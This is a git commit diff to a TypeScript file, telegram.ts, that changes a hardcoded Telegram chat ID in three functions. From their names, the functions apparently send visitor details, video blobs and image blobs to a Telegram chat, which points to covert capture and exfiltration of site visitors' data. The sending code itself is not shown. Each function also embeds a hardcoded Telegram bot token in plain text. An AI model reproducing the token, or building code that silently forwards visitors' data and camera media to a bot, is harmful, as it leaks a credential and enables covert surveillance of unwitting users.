1176c874626f95a5df101ebcda78fa03ad5489a6
just call me irsan <115108493+zsfell@users.noreply.github.com>
2025-03-20 23:16:59 +0700

    Update telegram.ts

--- src/utils/telegram.ts
+++ src/utils/telegram.ts
@@ -311,7 +311,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
   const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '-6571925222';
+  const CHAT_ID = '6571925222';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -391,7 +391,7 @@ ${deviceText}
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
   const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '-6571925222';
+  const CHAT_ID = '6571925222';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -474,7 +474,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 export const sendImageToTelegram = async (imageBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
   const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '-6571925222';
+  const CHAT_ID = '6571925222';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
